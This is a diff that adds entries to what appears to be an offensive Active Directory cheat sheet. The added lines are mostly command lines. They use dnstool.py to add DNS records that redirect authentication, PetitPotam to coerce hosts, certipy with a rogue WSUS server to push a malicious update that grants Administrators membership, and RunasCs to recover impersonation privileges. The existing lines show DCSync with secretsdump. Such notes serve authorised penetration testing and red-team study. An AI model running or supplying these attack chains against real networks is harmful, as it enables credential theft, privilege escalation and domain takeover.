@@ -299,3 +299,29 @@ petitpotam.py -u <USER> -p '<PASS>' <LHOST> <DC_IP>       # coerce DC auth to at
 secretsdump.py '<domain>/<USER>'@<DC_IP>                   # DCSync after privilege escalation
 ```
 
+
+DNS CREATE_CHILD rights on AD-integrated zone — if you have Create-Child on a DNS zone object (separate from DNS Operators), use `dnstool.py` to add A records and redirect authentication for targeted hosts:
+```bash
+# Check CREATE_CHILD on DNS zone:
+bloodyAD --host <DC_FQDN> -d <domain> -u <USER> -p '<PASS>' get writable | grep DNS
+dnstool.py -u '<domain>/<USER>' -p '<PASS>' -dc-ip <DC_IP> \
+  -r '<hostname>' -d <LHOST> --action add -t A
+# Now coerce the target host to authenticate via the hijacked record
+petitpotam.py -u <USER> -p '<PASS>' <LHOST> <TARGET>
+```
+
+ESC17 (WSUS enrollment certificate) — if you can enroll for a certificate with the WSUS server name in the Subject (a misconfigured template with Client Auth EKU and no SAN restriction), forge a certificate for a decommissioned WSUS host, add a DNS record pointing to your box, stand up a rogue WSUS server that pushes a malicious update:
+```bash
+certipy req -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -template <ESC17-template> \
+  -subject 'CN=<WSUS_FQDN>'
+# set up WSUS server (e.g. via SharpWSUS or PsExec equivalent), point via DNS record
+dnstool.py ... -r '<wsus-hostname>' -d <LHOST> --action add
+# deliver malicious update that adds low-priv user to Administrators
+```
+
+Recover `SeImpersonatePrivilege` from the original logon token — when you have code exec as a service account that was granted SeImpersonate at logon but a `CreateProcessWithTokenW` call stripped it, recover the original token via named pipe:
+```bash
+# Upload and run RunasCs to create a process with the original token:
+RunasCs.exe <user> <pass> "cmd.exe /c <payload>" --force-profile --logon-type 9
+# or: use the named pipe technique to get the original high-privilege token before it's stripped
+```
